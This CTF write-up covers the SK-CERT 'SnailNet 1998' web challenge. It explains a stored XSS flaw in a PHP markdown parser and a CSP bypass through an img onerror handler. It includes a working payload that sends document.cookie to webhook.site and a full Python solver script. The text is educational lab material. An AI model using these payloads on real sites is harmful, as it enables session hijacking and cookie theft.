# 🐌 SnailNet 1998 — SK-CERT CTF Web Challenge Writeup

> **Author:** Senpai
> **Category:** Web Exploitation  
> **Flag:** `SK-CERT{sl1m4c1k_m4c1k_vystrc_r0zky}`

---

## 📋 Challenge Overview

**SnailNet 1998** simulates a legacy PHP forum environment circa 1998. The objective is to **exfiltrate the administrator's session cookie**, which contains the flag.

The challenge layers multiple real-world security concepts on top of each other, making it a great exercise in chained exploitation.

| Attribute | Details |
|---|---|
| **Category** | Web Exploitation |
| **Primary Vulnerability** | Stored XSS via Markdown Parser Logic Flaw |
| **Secondary Obstacles** | CSP Restrictions, Internal Docker Networking, Server Latency |
| **Flag Format** | `SK-CERT{...}` |

---

## 🏗️ Environment Architecture

Understanding the network topology is **critical** here — the bot and the web application interact inside a private Docker network, which is the key to the whole exploit chain.

### Docker Services (`docker-compose.yml`)

```
┌─────────────────────────────────────────────────┐
│                  Docker Network                  │
│                                                  │
│  ┌──────────┐    ┌──────────┐    ┌───────────┐  │
│  │   app    │    │   bot    │    │   nginx   │  │
│  │ PHP-FPM  │◄───│Puppeteer │◄───│  Reverse  │  │
│  │  Forum   │    │  Node.js │    │   Proxy   │  │
│  └──────────┘    └──────────┘    └─────┬─────┘  │
│                                        │        │
└────────────────────────────────────────┼────────┘
                                         │ :6767 → :80
                                    Public Internet
```

| Service | Role |
|---|---|
| `app` | PHP-FPM container running the SnailNet forum |
| `bot` | Node.js + Puppeteer — visits user-submitted URLs as the admin |
| `nginx` | Public-facing reverse proxy; routes `/bot/` → bot, everything else → app |

### ⚠️ The "Internal Hostname" Trap

This is the most important architectural detail. Inside `bot/server.js`, the flag cookie is scoped to the **internal** Docker hostname `http://nginx`:

```javascript
// bot/server.js
await page.setCookie({
  name:     'flag',
  value:    FLAG,
  url:      'http://nginx',  // ← Internal hostname!
  path:     '/',
  httpOnly: false,
});
```

> **Key Insight:** If you send the bot to the public IP (`http://46.62.153.171:6767`), the browser will **not** attach the flag cookie — the domain doesn't match `http://nginx`. The exploit payload **must** force the bot to visit the internal `http://nginx` URL.

---

## 🔍 Vulnerability Deep Dive: The Markdown Parser

The vulnerability lives in `web/lib/content.php`, specifically in how it processes image tags. There are **four steps** in the sanitization flow, and one fatal mistake.

### Step-by-Step Sanitization Flow

**Step 1 — Global Escaping**

All user input is first run through `htmlspecialchars()`, converting dangerous characters like `"`, `<`, `>` into their HTML entities:

```php
$text = htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
// `"` becomes `&quot;`, `<` becomes `&lt;`, etc.
```

**Step 2 — Regex Matching**

The parser scans the now-escaped text for Markdown image syntax:

```
!\[(.*?)\]\((.*?)\)
```

**Step 3 — The Fatal Mistake 💀**

Inside the regex callback, the parser **decodes** the URL portion before validating it — completely undoing the escaping from Step 1:

```php
$url = safe_markdown_url(htmlspecialchars_decode($m[2], ENT_QUOTES));
//                       ^^^^^^^^^^^^^^^^^^^^^^^^^^
//                       This reverses the sanitization!
```

**Step 4 — Weak URL Validation**

`safe_markdown_url()` only checks that the URL *starts with* a permitted prefix. It doesn't validate anything after that:

```php
function safe_markdown_url(string $url): string {
    if (preg_match('~^(https?://|/uploads/)~i', trim($url))) {
        return htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
    }
    return '#';
}
```

### 💥 The Exploit Primitive

Because the URL is decoded before being placed into an HTML `src` attribute, we can inject additional HTML attributes by breaking out of the `src` quote with a `"` character embedded in the URL.

**Payload:**
```
http://webhook.site/TOKEN//?dummy" onerror="this.src='http://webhook.site/TOKEN/?c='+document.cookie" dummy2="
```

**Resulting HTML rendered by the app:**
```html
<img src="http://webhook.site/TOKEN//?dummy"
     onerror="this.src='http://webhook.site/TOKEN/?c='+document.cookie"
     dummy2="">
```

The image `src` will fail to load (404), triggering the `onerror` handler, which makes a secondary request to our webhook carrying `document.cookie`.

---

## 🛡️ Bypassing Security Controls

### Content Security Policy (CSP)

The application sets the following CSP header in `index.php`:

```
Content-Security-Policy: default-src 'self'; img-src http: https: data:;
```

| Directive | Effect |
|---|---|
| `default-src 'self'` | Blocks inline `<script>` tags and external scripts |
| `img-src http: https: data:` | Explicitly **allows** images from any HTTP/HTTPS source |

**The Bypass:** The `onerror` attribute is an inline event handler on an `<img>` tag. The CSP lacks `script-src 'none'` or an explicit `unsafe-inline` block on event handlers. Because the image `src` itself points to a CSP-permitted source (`http:`), the browser executes the `onerror` handler when that image fails to load.

> **Lesson:** A CSP that restricts scripts but doesn't account for HTML event attributes is not sufficient protection against XSS.

---

## 🚀 Step-by-Step Exploitation Guide

### Step 1: Prepare Your Exfiltration Listener

1. Go to [Webhook.site](https://webhook.site).
2. Copy your unique UUID token (e.g., `6a1df1fb-befb-4ce9-b8bd-c074cebef373`).
3. Keep this tab open — the flag will arrive here.

### Step 2: Create an Attacker Account

```
http://46.62.153.171:6767/index.php?action=register
```

Register with any username and password, then log in at `index.php?action=login`.

### Step 3: Inject the Stored XSS

Navigate to the **Join Request** page:

```
index.php?action=join-request
```

Submit the following payload in the Markdown field, replacing `TOKEN` with your Webhook.site UUID:

```markdown
![[x](https://webhook.site/TOKEN/?c=)](https://webhook.site/TOKEN//?dummy" onerror="this.src='https://webhook.site/TOKEN/?c='+document.cookie" dummy2=")
```

After submitting, note the **Request UUID** shown in the "New Users" section (e.g., `80aeffe9c3e300d0cc1053446bd1bbb1`).

### Step 4: Trigger the Admin Bot

1. Navigate to the bot submission page at `http://46.62.153.171:6767/bot`.
2. Submit the **internal** URL (not the public IP!):

```
http://nginx/index.php?action=view-request&id=YOUR_REQUEST_UUID
```

> **⚠️ Note:** The server can be slow. If the bot returns `"visit failed"`, increase your timeout or retry. The bot must resolve the internal `nginx` hostname.

### Step 5: Retrieve the Flag

1. Open your Webhook.site dashboard.
2. Wait for a `GET` request from the challenge server's IP.
3. Check the `c` query parameter — it contains the admin's cookies.
4. **Flag:** `SK-CERT{sl1m4c1k_m4c1k_vystrc_r0zky}`

---

## 🤖 Automated Solver Script

The following Python script automates the entire chain: CSRF handling, account registration, payload injection, bot triggering, and timeout management.

```python
#!/usr/bin/env python3
"""
SnailNet 1998 — SK-CERT CTF Automated Solver
Author: Saad (mksaad)
"""

import html
import random
import re
import string
import requests
from bs4 import BeautifulSoup

PUBLIC_BASE   = "http://46.62.153.171:6767"
INTERNAL_BASE = "http://nginx"
WEBHOOK_URL   = "https://webhook.site/6a1df1fb-befb-4ce9-b8bd-c074cebef373"
TIMEOUT       = 120


def randstr(n=8):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def get_csrf(session, url):
    r = session.get(url, timeout=TIMEOUT)
    soup = BeautifulSoup(r.text, "html.parser")
    node = soup.find("input", {"name": "csrf_token"})
    return node["value"]


def register_and_login(session, username, password):
    # Register
    csrf = get_csrf(session, f"{PUBLIC_BASE}/index.php?action=register")
    session.post(
        f"{PUBLIC_BASE}/index.php?action=register",
        data={"csrf_token": csrf, "username": username, "password": password},
        allow_redirects=False,
        timeout=TIMEOUT
    )
    # Login
    csrf = get_csrf(session, f"{PUBLIC_BASE}/index.php?action=login")
    session.post(
        f"{PUBLIC_BASE}/index.php?action=login",
        data={"csrf_token": csrf, "username": username, "password": password},
        allow_redirects=False,
        timeout=TIMEOUT
    )


def submit_join_request(session, payload):
    csrf = get_csrf(session, f"{PUBLIC_BASE}/index.php?action=join-request")
    session.post(
        f"{PUBLIC_BASE}/index.php?action=join-request",
        data={"csrf_token": csrf, "content_markdown": payload},
        allow_redirects=False,
        timeout=TIMEOUT
    )
    # Extract the request UUID from the index page
    r2 = session.get(f"{PUBLIC_BASE}/index.php", timeout=TIMEOUT)
    m = re.search(r"view-request(?:&amp;|&)id=([a-f0-9]{32})", r2.text)
    return m.group(1)


def main():
    session = requests.Session()
    user, pw = f"hacker_{randstr()}", f"P@ss_{randstr()}!"

    payload = (
        f"![[x]({WEBHOOK_URL}/?c=)]"
        f"({WEBHOOK_URL}//?dummy\" onerror=\"this.src='{WEBHOOK_URL}/?c='"
        f"+document.cookie\" dummy2=\")"
    )

    print(f"[*] Username : {user}")
    print(f"[*] Password : {pw}")
    print(f"[*] Webhook  : {WEBHOOK_URL}")
    print(f"[*] Payload  : {payload}\n")

    print("[*] Registering and logging in...")
    register_and_login(session, user, pw)
    print("[+] Logged in successfully.")

    print("[*] Submitting malicious join request...")
    uuid = submit_join_request(session, payload)
    print(f"[+] Request UUID: {uuid}")

    bomb_url = f"{INTERNAL_BASE}/index.php?action=view-request&id={uuid}"
    print(f"[*] Sending URL to the bot: {bomb_url}")
    r = requests.post(
        f"{PUBLIC_BASE}/bot/visit",
        json={"url": bomb_url},
        timeout=TIMEOUT
    )
    print(f"[+] Bot response: {r.text}")
    print(f"\n[*] Done. Check {WEBHOOK_URL} for the flag!")


if __name__ == "__main__":
    main()
```

### Example Solver Output

```
[*] Username : hacker_wnbxy67d
[*] Password : P@ss_wnbxy67d!9x
[*] Webhook  : https://webhook.site/6a1df1fb-befb-4ce9-b8bd-c074cebef373
[*] Payload  : ![[x](https://webhook.site/.../...

[*] Registering and logging in...
[+] Logged in successfully.
[*] Submitting malicious join request...
[+] Request UUID: 80aeffe9c3e300d0cc1053446bd1bbb1
[*] Sending URL to the bot: http://nginx/index.php?action=view-request&id=80ae...
[+] Bot response: HTTP 200 {"status":"visited"}

[*] Done. Check your Webhook.site inbox for a request containing the flag.
```

---

## 🏁 How to See the Flag

Once the bot visits your poisoned page:

1. Open your **Webhook.site** dashboard.
2. Look for a `GET` request arriving from the challenge server's IP.
3. Navigate to the **Query Strings** section.
4. The `c` parameter contains the admin's session cookie — and the flag.

```
c = flag=SK-CERT{sl1m4c1k_m4c1k_vystrc_r0zky}
```

---

## 🧠 Lessons Learned

### 1. Sanitization Order Matters

Never call `htmlspecialchars_decode()` on user input **after** it has already been escaped and **before** it is used in a sensitive HTML context. Encoding → decoding → re-encoding creates a window where injected characters are briefly unescaped and can escape their intended attribute.

```
Input → htmlspecialchars() → regex match → htmlspecialchars_decode() ← ⚠️ Mistake
```

### 2. Internal vs. External Hostnames in Containers

In Dockerised CTF challenges (and real deployments), always check `docker-compose.yml` to understand **where cookies are scoped**. A cookie set for `http://nginx` is invisible to a browser visiting `http://46.62.153.171:6767`. The exploit must use the correct origin.

### 3. CSP Is Not a Silver Bullet

A Content Security Policy that restricts `<script>` tags but does not address inline event handlers (`onerror`, `onload`, `onclick`, etc.) can still be bypassed via attribute injection. A robust CSP should include:

```
script-src 'self';          // Blocks external scripts
// AND ensure no attribute injection is possible via input sanitization
```

Without strict input validation, CSP alone cannot prevent XSS from attribute-based event handlers.

---
